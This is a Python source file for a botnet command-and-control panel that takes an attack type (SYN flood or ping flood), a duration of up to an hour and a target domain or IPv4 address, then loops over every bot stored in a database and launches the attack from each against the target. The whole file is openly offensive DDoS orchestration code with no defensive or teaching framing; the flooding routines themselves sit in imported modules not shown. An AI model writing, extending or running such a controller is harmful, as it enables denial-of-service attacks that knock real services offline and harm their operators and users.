# Control center for parsing and issuing commands to bots

import argparse
import sys
import threading

import resolve
import database
import attack

from defs import ATTACK_TYPES, DB_PATH

def parse_args():
    parser = argparse.ArgumentParser(
        description='Command and control panel for bots'
    )
    parser.add_argument(
        '-a', '--attack-type',
        metavar='attack_type',
        dest='attack_type',
        choices=ATTACK_TYPES,
        required=True,
        help='''
            specify type of attack: syn_flood, ping_flood
        '''
    )
    parser.add_argument(
        '-d', '--duration',
        metavar='duration',
        dest='duration',
        type=int,
        choices=range(1, 3600),
        required=True,
        help='set duration of attack between 1 and 3600 seconds'
    )
    parser.add_argument(
        '-t', '--target',
        metavar='target',
        dest='target',
        required=True,
        help='specify domain name/IPv4 address to attack'
    )

    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()

    target_ip = resolve.resolve_host(args.target)
    if target_ip is None:
        print('[!] Unable to launch attack')
        sys.exit(1)

    attack_type = ATTACK_TYPES[args.attack_type]

    conn = database.open_database(DB_PATH)
    cur = conn.cursor()
    for bot in cur.execute('SELECT * FROM Bots'):
        t = threading.Thread(
            target=attack.launch_attack,
            args=(bot, attack_type, args.duration, target_ip)
        )
        t.start()
        t.join()
    conn.close()
